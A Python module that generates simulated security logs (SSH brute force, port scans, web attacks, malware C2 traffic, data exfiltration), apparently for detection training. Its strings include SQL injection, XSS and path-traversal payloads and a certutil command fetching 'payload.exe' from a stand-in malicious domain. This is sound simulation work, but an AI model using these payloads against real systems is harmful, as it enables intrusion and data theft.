
import os
import re
import time
import random
import logging
import threading
import hashlib
import ipaddress
from datetime import datetime

import config
import utils

class LogGenerator:
    """Generates realistic logs in real-time to simulate a live environment"""
    
    def __init__(self, log_directory=None):
        """Initialize the log generator"""
        self.log_directory = log_directory or config.LOGS_DIR
        self.running = False
        self.thread = None
        
        # Ensure log directory exists
        if not os.path.exists(self.log_directory):
            os.makedirs(self.log_directory)
            
        # Setup log files based on config
        self.log_files = {
            'auth': os.path.join(self.log_directory, 'auth.log'),
            'web': os.path.join(self.log_directory, 'web.log'),
            'firewall': os.path.join(self.log_directory, 'firewall.log'),
            'ids': os.path.join(self.log_directory, 'ids.log'),
            'windows': os.path.join(self.log_directory, 'windows.log')
        }
        
        # Create initial log files
        for log_file in self.log_files.values():
            with open(log_file, 'w') as f:
                f.write("")
                
        # Set up attack scenarios
        self.setup_attack_scenarios()
                
    def setup_attack_scenarios(self):
        """Set up realistic attack scenarios that will play out over time"""
        # Define normal IPs (legitimate users)
        self.legitimate_ips = [
            "10.0.0.15",    # Admin
            "10.0.0.20",    # Developer
            "10.0.0.25",    # Marketing
            "10.0.0.30",    # Sales
            "192.168.1.5"   # Remote worker
        ]
        
        # Generate random attacker IPs
        self.attacker_ips = [
            str(ipaddress.IPv4Address(random.randint(0, 2**32-1))) 
            for _ in range(5)
        ]
        
        # Malicious User-Agents
        self.malicious_user_agents = [
            "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)",
            "sqlmap/1.4.11#stable (http://sqlmap.org)",
            "Wget/1.20.3 (linux-gnu)",
            "python-requests/2.25.1",
            "masscan/1.0 (https://github.com/robertdavidgraham/masscan)"
        ]
        
        # Normal User-Agents
        self.normal_user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1 Safari/605.1.15",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36"
        ]
        
        # Attack patterns
        self.attack_scenarios = [
            self.generate_brute_force_attempt,
            self.generate_port_scan_attempt,
            self.generate_web_attack_attempt,
            self.generate_malware_communication,
            self.generate_data_exfiltration
        ]
        
        # Timing for scenario execution
        self.scenario_timers = {scenario.__name__: 0 for scenario in self.attack_scenarios}
        
    def generate_normal_traffic(self):
        """Generate normal background traffic logs"""
        # Auth log - successful logins
        if random.random() < 0.1:  # 10% chance each cycle
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            user = random.choice(['john', 'alice', 'bob', 'admin', 'dev'])
            ip = random.choice(self.legitimate_ips)
            log_entry = f"{timestamp} sshd[{random.randint(1000, 9999)}]: Accepted password for {user} from {ip} port {random.randint(30000, 65000)} ssh2\n"
            
            with open(self.log_files['auth'], 'a') as f:
                f.write(log_entry)
                
        # Web server logs - normal access
        if random.random() < 0.3:  # 30% chance each cycle
            timestamp = datetime.now().strftime("%d/%b/%Y:%H:%M:%S +0000")
            ip = random.choice(self.legitimate_ips)
            user_agent = random.choice(self.normal_user_agents)
            path = random.choice(['/', '/index.html', '/about', '/products', '/contact', '/images/logo.png'])
            status = random.choices([200, 304, 404], weights=[0.94, 0.05, 0.01])[0]
            size = random.randint(1024, 10240) if status != 304 else 0
            
            log_entry = f'{ip} - - [{timestamp}] "GET {path} HTTP/1.1" {status} {size} "-" "{user_agent}"\n'
            
            with open(self.log_files['web'], 'a') as f:
                f.write(log_entry)
                
        # Firewall logs - normal traffic
        if random.random() < 0.2:  # 20% chance each cycle
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            src_ip = random.choice(self.legitimate_ips)
            dst_ip = "10.0.0.1"  # Gateway
            proto = random.choice(['TCP', 'UDP'])
            sport = random.randint(30000, 65000)
            dport = random.choice([80, 443, 53, 123])
            action = "ACCEPT"
            
            log_entry = f"{timestamp} {action} SRC={src_ip} DST={dst_ip} PROTO={proto} SPT={sport} DPT={dport}\n"
            
            with open(self.log_files['firewall'], 'a') as f:
                f.write(log_entry)
                
    def generate_brute_force_attempt(self):
        """Generate logs for a SSH brute force attack"""
        if time.time() - self.scenario_timers[self.generate_brute_force_attempt.__name__] < 120:
            return False  # Only run this scenario every 2 minutes
            
        attacker_ip = random.choice(self.attacker_ips)
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        # Generate 6-10 failed login attempts
        attempts = random.randint(6, 10)
        for i in range(attempts):
            user = random.choice(['root', 'admin', 'administrator', 'oracle', 'postgres', 'ubuntu'])
            log_entry = f"{timestamp} sshd[{random.randint(1000, 9999)}]: Failed password for {user} from {attacker_ip} port {random.randint(30000, 65000)} ssh2\n"
            
            with open(self.log_files['auth'], 'a') as f:
                f.write(log_entry)
                
            # Small delay between attempts
            time.sleep(0.05)
            
        # Update the timer
        self.scenario_timers[self.generate_brute_force_attempt.__name__] = time.time()
        return True
        
    def generate_port_scan_attempt(self):
        """Generate logs for a port scanning attack"""
        if time.time() - self.scenario_timers[self.generate_port_scan_attempt.__name__] < 180:
            return False  # Only run this scenario every 3 minutes
            
        attacker_ip = random.choice(self.attacker_ips)
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        # Common ports to scan
        ports = [21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445, 993, 995, 1433, 3306, 3389, 5432, 8080]
        random.shuffle(ports)
        
        # Generate firewall blocks for port scan
        for port in ports[:15]:  # Scan 15 ports
            log_entry = f"{timestamp} BLOCKED SRC={attacker_ip} DST=10.0.0.1 PROTO=TCP SPT={random.randint(30000, 65000)} DPT={port}\n"
            
            with open(self.log_files['firewall'], 'a') as f:
                f.write(log_entry)
                
            # Generate IDS alert for some ports
            if random.random() < 0.3:  # 30% chance for IDS to also log
                signature_id = 1000000 + port
                log_entry = f"{timestamp} [**] [1:{signature_id}:1] SCAN TCP Port Scan [**] [Classification: Attempted Information Leak] [Priority: 2] {{TCP}} {attacker_ip}:{random.randint(30000, 65000)} -> 10.0.0.1:{port}\n"
                
                with open(self.log_files['ids'], 'a') as f:
                    f.write(log_entry)
            
            # Small delay between attempts
            time.sleep(0.02)
            
        # Update the timer
        self.scenario_timers[self.generate_port_scan_attempt.__name__] = time.time()
        return True
        
    def generate_web_attack_attempt(self):
        """Generate logs for web application attacks"""
        if time.time() - self.scenario_timers[self.generate_web_attack_attempt.__name__] < 150:
            return False  # Only run this scenario every 2.5 minutes
            
        attacker_ip = random.choice(self.attacker_ips)
        timestamp = datetime.now().strftime("%d/%b/%Y:%H:%M:%S +0000")
        user_agent = random.choice(self.malicious_user_agents)
        
        # SQL Injection attempts
        sqli_paths = [
            "/login.php?username=admin'--",
            "/products.php?id=1 OR 1=1",
            "/search?q=test' UNION SELECT username,password FROM users--",
            "/profile.jsp?id=1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)",
            "/news.php?id=1 AND 1=1"
        ]
        
        # XSS attempts
        xss_paths = [
            "/comment.php?text=<script>alert(1)</script>",
            "/search?q=<img src=x onerror=alert('XSS')>",
            "/profile?name=<svg/onload=alert('XSS')>",
            "/feedback?message=<iframe src=javascript:alert('XSS')></iframe>"
        ]
        
        # Path traversal attempts
        pt_paths = [
            "/download.php?file=../../../../etc/passwd",
            "/image.php?file=../../../windows/win.ini",
            "/include.php?module=../../../../../proc/self/environ",
            r"/admin/config?path=..\..\..\..\windows\system32\drivers\etc\hosts"
        ]
        
        # Generate web attacks
        attack_paths = random.choice([sqli_paths, xss_paths, pt_paths])
        for path in attack_paths[:3]:  # Try 3 variations
            status = random.choices([200, 403, 404, 500], weights=[0.4, 0.3, 0.2, 0.1])[0]
            size = random.randint(500, 2000)
            
            log_entry = f'{attacker_ip} - - [{timestamp}] "GET {path} HTTP/1.1" {status} {size} "-" "{user_agent}"\n'
            
            with open(self.log_files['web'], 'a') as f:
                f.write(log_entry)
                
            # Generate IDS alert for some attacks
            if random.random() < 0.5:  # 50% chance for IDS to also log
                attack_type = "SQL Injection" if path in sqli_paths else "XSS" if path in xss_paths else "Path Traversal"
                signature_id = 1000100 + random.randint(1, 20)
                log_entry = f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')} [**] [1:{signature_id}:1] WEB-ATTACK {attack_type} Attempt [**] [Classification: Web Application Attack] [Priority: 1] {{TCP}} {attacker_ip}:{random.randint(30000, 65000)} -> 10.0.0.1:80\n"
                
                with open(self.log_files['ids'], 'a') as f:
                    f.write(log_entry)
            
            # Small delay between attempts
            time.sleep(0.1)
            
        # Update the timer
        self.scenario_timers[self.generate_web_attack_attempt.__name__] = time.time()
        return True
        
    def generate_malware_communication(self):
        """Generate logs for simulated malware C2 communication"""
        if time.time() - self.scenario_timers[self.generate_malware_communication.__name__] < 240:
            return False  # Only run this scenario every 4 minutes
            
        # Choose a random internal IP (victim)
        victim_ip = random.choice(self.legitimate_ips)
        c2_server = random.choice(self.attacker_ips)
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        # Generate suspicious DNS queries
        domains = [
            f"cdn{random.randint(1,99)}.evil-domain.com",
            f"api{random.randint(1,99)}.malicious-site.net",
            f"update{random.randint(1,99)}.badserver.org",
            f"{hashlib.md5(str(time.time()).encode()).hexdigest()[:8]}.ddns.net"
        ]
        
        # DNS queries
        for domain in domains[:2]:
            log_entry = f"{timestamp} named[{random.randint(1000, 9999)}]: client {victim_ip}#{random.randint(30000, 65000)}: query: {domain} IN A\n"
            with open(self.log_files['auth'], 'a') as f:
                f.write(log_entry)
                
        # Firewall logs for C2 traffic
        for _ in range(3):
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            sport = random.randint(30000, 65000)
            dport = random.choice([80, 443, 8080, 8443, 53, 22, 4444])
            proto = random.choice(["TCP", "UDP"])
            action = random.choices(["ACCEPT", "BLOCKED"], weights=[0.7, 0.3])[0]
            
            log_entry = f"{timestamp} {action} SRC={victim_ip} DST={c2_server} PROTO={proto} SPT={sport} DPT={dport}\n"
            with open(self.log_files['firewall'], 'a') as f:
                f.write(log_entry)
                
        # IDS alerts for C2
        log_entry = f"{timestamp} [**] [1:1054001:1] MALWARE-CNC Trojan Communication Detected [**] [Classification: A Network Trojan was Detected] [Priority: 1] {{TCP}} {victim_ip}:{random.randint(30000, 65000)} -> {c2_server}:{random.choice([80, 443, 8080, 8443])}\n"
        with open(self.log_files['ids'], 'a') as f:
            f.write(log_entry)
            
        # Windows Event Log for suspicious process
        process_names = ["svchost.exe", "powershell.exe", "cmd.exe", "regsvr32.exe", "certutil.exe"]
        suspicious_args = [
            "-enc IAB3AHIAaQB0AGUALQBoAG8AcwB0ACAAIgBIAGEAYwBrAGUAZAAhACIA",  # PowerShell encoded command
            "/c ping -n 5 evil-domain.com",  # Command prompt
            "/u scrobj.dll -s",  # regsvr32
            "-urlcache -split -f http://evil-domain.com/payload.exe"  # certutil
        ]
        
        process = random.choice(process_names)
        pid = random.randint(1000, 9999)
        event_id = 4688 if process != "svchost.exe" else 7045
        
        if process in ["powershell.exe", "cmd.exe", "regsvr32.exe", "certutil.exe"]:
            args = random.choice(suspicious_args)
        else:
            args = ""
            
        log_entry = f"{timestamp} [Security] [EventID {event_id}] A new process has been created. Process: {process} PID: {pid} User: {'SYSTEM' if random.random() < 0.3 else 'User'} CommandLine: {process} {args}\n"
        with open(self.log_files['windows'], 'a') as f:
            f.write(log_entry)
            
        # Update the timer
        self.scenario_timers[self.generate_malware_communication.__name__] = time.time()
        return True
        
    def generate_data_exfiltration(self):
        """Generate logs for simulated data exfiltration"""
        if time.time() - self.scenario_timers[self.generate_data_exfiltration.__name__] < 300:
            return False  # Only run this scenario every 5 minutes
            
        # Choose a random internal IP (victim)
        victim_ip = random.choice(self.legitimate_ips)
        exfil_server = random.choice(self.attacker_ips)
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        # Large outbound data transfers
        protocols = ["TCP", "UDP"]
        ports = [21, 22, 80, 443, 8080]
        
        # Generate multiple large transfers
        for _ in range(5):
            proto = random.choice(protocols)
            sport = random.randint(30000, 65000)
            dport = random.choice(ports)
            
            # Large data transfer (1MB to 10GB range)
            if random.random() < 0.7:  # 70% chance to be accepted
                action = "ACCEPT"
                bytes_out = random.randint(1000000, 10000000000)
                
                # Have the firewall log catch these large transfers
                log_entry = f"{timestamp} {action} SRC={victim_ip} DST={exfil_server} PROTO={proto} SPT={sport} DPT={dport} SIZE={bytes_out}\n"
                with open(self.log_files['firewall'], 'a') as f:
                    f.write(log_entry)
                    
                # IDS alerts for some exfiltration
                if random.random() < 0.5:  # 50% chance for IDS to detect
                    log_entry = f"{timestamp} [**] [1:1908001:1] INDICATOR-COMPROMISE Data Exfiltration [**] [Classification: Potentially Bad Traffic] [Priority: 2] {{TCP}} {victim_ip}:{sport} -> {exfil_server}:{dport} SIZE={bytes_out}\n"
                    with open(self.log_files['ids'], 'a') as f:
                        f.write(log_entry)
            
            time.sleep(0.1)
            
        # Windows Event Log for file access
        sensitive_files = [
            r"C:\Users\Administrator\Documents\Financial Reports\\",
            r"C:\Users\HR\Documents\Employee Records\\",
            r"C:\Confidential\Project Data\\",
            r"C:\Program Files\Database\customer.db"
        ]
        
        file = random.choice(sensitive_files)
        event_id = 4663  # File access
        
        log_entry = f"{timestamp} [Security] [EventID {event_id}] File access: {file} User: User Action: Read\n"
        with open(self.log_files['windows'], 'a') as f:
            f.write(log_entry)
            
        # Update the timer
        self.scenario_timers[self.generate_data_exfiltration.__name__] = time.time()
        return True
        
    def run(self):
        """Main loop for generating logs"""
        logging.info("Log generator started")
        self.running = True
        
        while self.running:
            try:
                # Generate normal background traffic
                self.generate_normal_traffic()
                
                # Randomly trigger attack scenarios
                for scenario in self.attack_scenarios:
                    if random.random() < 0.1:  # 10% chance to attempt each scenario each cycle
                        scenario()
                
                # Wait a short time before next cycle
                time.sleep(0.5)
            except Exception as e:
                logging.error(f"Error in log generator: {str(e)}")
                # Continue running despite errors
            
    def start(self):
        """Start the log generator in a separate thread"""
        self.thread = threading.Thread(target=self.run)
        self.thread.daemon = True
        self.thread.start()
        logging.info("Log generator thread started")
        return self.thread
        
    def stop(self):
        """Stop the log generator"""
        self.running = False
        if self.thread:
            self.thread.join(timeout=1.0)
        logging.info("Log generator stopped")


if __name__ == "__main__":
    # Stand-alone test
    utils.setup_logging()
    log_gen = LogGenerator()
    print("Starting log generator...")
    log_gen.start()
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("Stopping...")
    finally:
        log_gen.stop()